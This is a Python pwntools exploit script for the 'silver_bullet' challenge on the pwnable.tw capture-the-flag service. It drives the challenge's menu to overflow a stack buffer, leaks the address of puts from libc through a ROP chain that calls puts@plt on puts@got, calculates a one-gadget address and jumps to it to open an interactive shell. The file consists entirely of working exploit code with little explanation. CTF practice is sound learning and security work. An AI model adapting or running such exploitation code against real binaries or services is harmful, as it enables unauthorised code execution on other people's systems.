from pwn import *

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long

addr = "chall.pwnable.tw"
port = 10103
binary = "./silver_bullet"

elf = ELF(binary)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

libc = ELF("./libc_32.so.6")
puts_libc = libc.symbols['puts']
system_libc = libc.symbols['system']

main = 0x08048954

s = remote(addr, port)

def menu():
    sleep(0.3)
    print s.recvuntil("+++++++++++++++++++++++++++")
    print s.recvuntil("       Silver Bullet       ")
    print s.recvuntil("+++++++++++++++++++++++++++")
    print s.recvuntil(" 1. Create a Silver Bullet ")
    print s.recvuntil(" 2. Power up Silver Bullet ")
    print s.recvuntil(" 3. Beat the Werewolf      ")
    print s.recvuntil(" 4. Return                 ")
    print s.recvuntil("+++++++++++++++++++++++++++")
    print s.recvuntil("Your choice :")


def Create(bullet):
    menu()
    s.send("1")
    sleep(0.3)
    print s.recvuntil("Give me your description of bullet :")
    s.send(bullet)
    print s.recvuntil("Your power is : ")

    print s.recvuntil("Good luck !!")

def Power(bullet):
    menu()
    s.send("2")
    sleep(0.3)
    print s.recvuntil("Give me your another description of bullet :")
    s.send(bullet)
    sleep(0.3)
    print s.recvuntil("Your new power is : ")
    print s.recvuntil("Enjoy it !")

def Beat():
    menu()
    s.send("3")
    sleep(0.3)
    print s.recvuntil(">----------- Werewolf -----------<")
    print s.recvuntil(" + NAME : ")
    print s.recvuntil(" + HP : ")
    print s.recvuntil(">--------------------------------<")
    print s.recvuntil("Try to beat it .....")
    sleep(0.3)
    print s.recvline()
    print s.recvline()



def leak():
    payload = "A"*7
    payload += p32(puts_plt)
    payload += p32(main)
    payload += p32(puts_got)

    Create("A"*47)
    Power("A"*1)
    Power(payload)
    Beat()
    Beat()
    sleep(0.3)
    puts_libc = up32(s.recv(4))
    print "puts_libc : %x" % puts_libc
    return puts_libc

def exploit(one_shot):
    payload = "A"*7
    payload += p32(one_shot)

    Create("A"*47)
    Power("A"*1)
    Power(payload)
    Beat()
    Beat()

puts_libc = leak()
one_shot = puts_libc - 0x24927
exploit(one_shot)

s.interactive()
s.close()
